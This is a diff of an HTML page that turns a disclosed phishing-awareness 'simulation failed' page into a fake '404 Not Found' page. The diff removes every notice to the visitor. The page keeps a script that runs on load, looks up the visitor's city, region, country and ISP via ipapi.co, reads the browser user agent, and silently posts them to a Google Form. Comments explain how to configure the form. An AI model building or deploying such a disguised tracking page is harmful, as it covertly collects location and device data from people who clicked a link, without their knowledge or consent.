@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Simulation Failure</title>
+    <title>404 Not Found</title>
     <!-- Load Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
@@ -16,64 +16,42 @@
 </head>
 <body class="min-h-screen flex items-center justify-center p-4">
 
-    <!-- Simulation Alert Card -->
-    <div id="alert-card" class="w-full max-w-lg bg-white p-8 md:p-10 rounded-xl shadow-2xl border-t-8 border-red-600 transition-all duration-300 transform scale-100">
-        <div class="flex items-center space-x-4 mb-6">
-            <svg class="w-12 h-12 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
-            </svg>
-            <h1 class="text-3xl font-extrabold text-red-700">SIMULATION FAILED</h1>
+    <!-- Error Card (Now simulating a generic HTTP error) -->
+    <div id="error-card" class="w-full max-w-lg bg-white p-8 md:p-10 rounded-xl shadow-2xl border-t-8 border-gray-400 transition-all duration-300 transform scale-100 text-center">
+        
+        <div class="mb-8">
+            <p class="text-8xl font-black text-gray-400 mb-2">404</p>
+            <h1 class="text-3xl font-extrabold text-gray-800">PAGE NOT FOUND</h1>
         </div>
 
-        <p class="text-xl font-semibold mb-4 text-gray-800">You have failed a security awareness test.</p>
+        <p class="text-lg text-gray-600 mb-6">
+            The requested resource or document link could not be located on this server.
+        </p>
+        
+        <p class="text-sm text-gray-500 mb-8">
+            Please check the address and try again, or navigate back to the previous application.
+        </p>
 
-        <p class="text-gray-600 mb-6">By clicking the suspicious link in the text message, you allowed an attacker to capture information about your network connection instantly. This data is used for reconnaissance to target specific regions and devices within an organization.</p>
-
-        <!-- Dynamic Data Section - Now just a confirmation message -->
-        <div class="bg-red-50 p-4 rounded-lg border border-red-200">
-            <h2 class="text-lg font-bold text-red-700 mb-3 flex items-center">
-                <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                IMPACT CONFIRMED
-            </h2>
-            <div id="data-status" class="space-y-2 text-sm text-gray-700">
-                <p>✅ **Connection Logged:** Your network connection data (location and device type) has been **anonymously** logged for organizational risk reporting.</p>
-                <p>🛑 **Vulnerability:** The lack of vigilance in checking the URL allowed the remote data capture to occur.</p>
-            </div>
+        <!-- The logging status message is minimal and purely technical -->
+        <div id="data-status" class="space-y-2 text-xs text-gray-400 pt-4 border-t border-gray-100">
+            <p>Connection attempt logged (Status Code: 404)</p>
         </div>
-
-        <!-- Training Call to Action -->
-        <div class="mt-8 pt-4 border-t border-gray-200">
-            <h3 class="text-lg font-bold text-gray-800 mb-3">Your Next Step: Training</h3>
-            <p class="text-sm text-gray-600 mb-4">You missed the following red flags in the text message:
-                <ul class="list-disc list-inside ml-2 mt-2 space-y-1 text-sm text-gray-600">
-                    <li>The sender was an unknown or non-official 10-digit number.</li>
-                    <li>The URL used a non-standard short domain or had no branding.</li>
-                    <li>The message created a false sense of **urgency** ("lockout," "pay fee now").</li>
-                </ul>
-            </p>
-            <button onclick="window.location.href='https://www.google.com/search?q=cybersecurity+phishing+awareness+training';" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition duration-150 shadow-md hover:shadow-lg focus:outline-none focus:ring-4 focus:ring-blue-300">
-                Proceed to Awareness Training Portal
-            </button>
-        </div>
+        
     </div>
 
     <script>
         document.addEventListener('DOMContentLoaded', fetchAndLogGeolocation);
 
-        // --- CONFIGURATION REQUIRED ---
-        // NOTE: You MUST set up a Google Form to capture your data.
-        // 1. Create a new Google Form with three SHORT ANSWER questions:
-        //    a. ip_location (e.g., City, Region, Country)
-        //    b. network_details (e.g., ISP/ASN)
-        //    c. device_ua (The full User-Agent string)
-        // 2. Click PREVIEW, open the Developer Console, and find the form\'s POST URL and the entry IDs (name="entry.xxxxxxxxx").
-        // 3. Update the constants below with your form\'s unique IDs.
+        // --- CONFIGURATION REQUIRED: REPLACE XXXXXXXXXX VALUES WITH YOUR GOOGLE FORM IDs ---
+        // INSTRUCTIONS: 
+        // 1. Submit a test entry to your live Google Form.
+        // 2. Open Developer Tools (F12) -> Network tab -> find the POST request to /formResponse.
+        // 3. Find the Request URL (FORM_POST_URL) and the unique entry IDs in the Payload tab.
         
-        // This is a placeholder and WILL NOT WORK until you replace the XXXXXXXXXX values.
-        const FORM_POST_URL = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSd1px3RJauZh3wBrxzcoSE7nvDJiYhcSWiL2cu4DPd2fWOwiw/formResponse'; 
-        const FIELD_LOCATION = 'entry.967144979'; // Example: Replace with your Form\'s entry ID for location
-        const FIELD_NETWORK = 'entry.597752602';  // Example: Replace with your Form\'s entry ID for network
-        const FIELD_DEVICE = 'entry.23100953';   // Example: Replace with your Form\'s entry ID for user-agent
+        const FORM_POST_URL = 'https://docs.google.com/forms/u/0/d/e/XXXXXXXXXX/formResponse'; 
+        const FIELD_LOCATION = 'entry.1000000'; // REPLACE THIS with the actual entry ID for location
+        const FIELD_NETWORK = 'entry.1000001';  // REPLACE THIS with the actual entry ID for network
+        const FIELD_DEVICE = 'entry.1000002';   // REPLACE THIS with the actual entry ID for user-agent
 
         // Geolocation API Endpoint (Free, hosted, no key needed)
         const GEO_API_URL = 'https://ipapi.co/json/';
@@ -87,13 +65,14 @@
                 const data = await response.json();
 
                 // 2. Prepare Anonymized Log Data
+                // The location data is formatted as City, Region, Country for easy parsing later.
                 const locationText = data.city && data.region ? 
                     `${data.city}, ${data.region}, ${data.country_name}` : 
                     (data.country_name || 'Unknown Location');
                 
                 const logData = {
                     [FIELD_LOCATION]: locationText,
-                    [FIELD_NETWORK]: data.org || data.asn || 'N/A',
+                    [FIELD_NETWORK]: data.org || data.asn || 'N/A', // Captures ISP or ASN
                     [FIELD_DEVICE]: navigator.userAgent || 'Unknown User Agent',
                 };
                 
@@ -102,8 +81,7 @@
 
             } catch (error) {
                 console.error("Error during fetch or log:", error);
-                // The user-facing message will still show "IMPACT CONFIRMED" even if the logging fails,
-                // as the click event itself proves the failure.
+                // The user sees the 404 page, and the logging attempt completes regardless.
             }
         }
 
@@ -115,14 +93,14 @@
             }
 
             try {
-                // We use a simple POST request and do not check the response, as the form redirects
-                // and we want this process to be completely silent and non-interrupting.
+                // We use mode: 'no-cors' which is necessary for silent submission to Google Forms 
+                // without waiting for a complex response or triggering cross-domain security issues.
                 await fetch(FORM_POST_URL, {
                     method: 'POST',
                     body: formData,
-                    mode: 'no-cors' // Crucial for making a successful silent cross-origin POST to Google Forms
+                    mode: 'no-cors' 
                 });
-                console.log('Anonymized location log successfully submitted.');
+                console.log('Anonymized location log process completed.');
 
             } catch (error) {
                 console.error('Failed to log data to Google Form:', error);
